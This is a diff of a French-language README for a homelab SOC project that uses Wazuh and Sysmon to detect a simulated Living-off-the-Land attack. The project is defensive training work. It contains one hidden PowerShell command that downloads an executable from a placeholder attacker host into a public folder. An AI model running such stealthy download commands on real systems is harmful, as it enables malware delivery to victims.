@@ -1,6 +1,6 @@
 # Déploiement d'un SOC Virtualisé & Détection d'Attaques Avancées
 
-## 🎯 Objectif du Projet
+## Objectif du Projet
 Création d'un homelab complet pour simuler un environnement d'entreprise. L'objectif est de déployer un SIEM (Wazuh), de configurer une collecte de journaux avancée sur les postes clients via Sysmon, et de démontrer la capacité à détecter des attaques de type "Living off the Land" (LotL) et des contournements de sécurité.
 
 ## Technologies & Outils
@@ -11,7 +11,7 @@ Création d'un homelab complet pour simuler un environnement d'entreprise. L'obj
 
 ## Architecture du Laboratoire
 1.  **Serveur Central :** Réception des logs via les règles natives Wazuh.
-2.  **Machine Cible (Windows) :** Déploiement de la configuration Sysmon (*SwiftOnSecurity*) pour pallier le manque de visibilité des journaux Windows natifs (notamment sur la création de processus et les requêtes réseau).
+2.  **Machine Cible (Windows) :** Déploiement de la configuration Sysmon (SwiftOnSecurity) pour pallier le manque de visibilité des journaux Windows natifs (notamment sur la création de processus et les requêtes réseau).
 3.  **Machine Attaquante (Kali) :** Génération du bruit, tests de pénétration et exécution des charges utiles.
 
 ---
@@ -24,3 +24,38 @@ Simulation d'un téléchargement furtif d'une charge utile malveillante par un a
 **Commande exécutée sur la cible :**
 ```powershell
 powershell.exe -nop -w hidden -c "Invoke-WebRequest -Uri 'http://[IP_KALI]/malware_test.exe' -OutFile 'C:\Users\Public\malware_test.exe'"
+```
+
+### 2. La Collecte (Configuration Sysmon)
+L'agent Wazuh seul ne détecte pas l'exécution de PowerShell comme malveillante. C'est l'intégration de Sysmon qui permet de capturer l'événement précis.
+
+**Fichier modifié sur l'agent (`ossec.conf`) :**
+```xml
+<localfile>
+  <location>Microsoft-Windows-Sysmon/Operational</location>
+  <log_format>eventchannel</log_format>
+</localfile>
+```
+
+### 3. La Détection (Analyse Blue Team)
+Grâce à la journalisation fine de l'Event ID 1 (Process Creation) par Sysmon, Wazuh intercepte la commande complète, analyse le comportement suspect et déclenche une alerte critique.
+
+*   **Règle déclenchée :** `92213`
+*   **Niveau de sévérité :** `15` (Critique)
+*   **Description :** Executable file dropped in folder commonly used by malware
+
+### Preuves de détection
+
+**Alerte interceptée par Wazuh :**
+*<img width="1253" height="943" alt="image" src="https://github.com/user-attachments/assets/58fc2640-2fa6-45f8-a864-c850446d31e6" />*
+
+**Tableau de bord et logs détaillés :**
+*<img width="1253" height="943" alt="image" src="https://github.com/user-attachments/assets/6acf2a4f-1c96-49e4-a68a-3e7141db253a" />*
+
+---
+
+## Conclusion & Compétences acquises
+*   Administration système (Linux/Windows) et réseau virtualisé.
+*   Déploiement et configuration d'agents de supervision (Wazuh, Sysmon).
+*   Troubleshooting de configurations XML (`ossec.conf`).
+*   Analyse de journaux (Blue Team) et compréhension des TTPs (Tactics, Techniques, and Procedures) selon le framework MITRE ATT&CK.
